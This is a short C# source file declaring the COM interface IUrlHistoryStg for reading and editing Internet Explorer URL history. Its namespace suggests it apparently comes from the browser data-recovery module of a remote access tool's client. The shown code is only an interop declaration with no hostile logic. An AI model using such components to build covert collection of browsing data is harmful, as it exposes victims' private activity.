using System;
using System.Runtime.InteropServices;

namespace xClient.Core.Recovery.Browsers;

[ComImport]
[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
[Guid("3C374A41-BAE4-11CF-BF7D-00AA006946EE")]
public interface IUrlHistoryStg
{
	object EnumUrls
	{
		[return: MarshalAs(UnmanagedType.IUnknown)]
		get;
	}

	void AddUrl(string pocsUrl, string pocsTitle, ADDURL_FLAG dwFlags);

	void DeleteUrl(string pocsUrl, int dwFlags);

	void QueryUrl([MarshalAs(UnmanagedType.LPWStr)] string pocsUrl, STATURL_QUERYFLAGS dwFlags, ref STATURL lpSTATURL);

	void BindToObject([In] string pocsUrl, [In] UUID riid, IntPtr ppvOut);
}
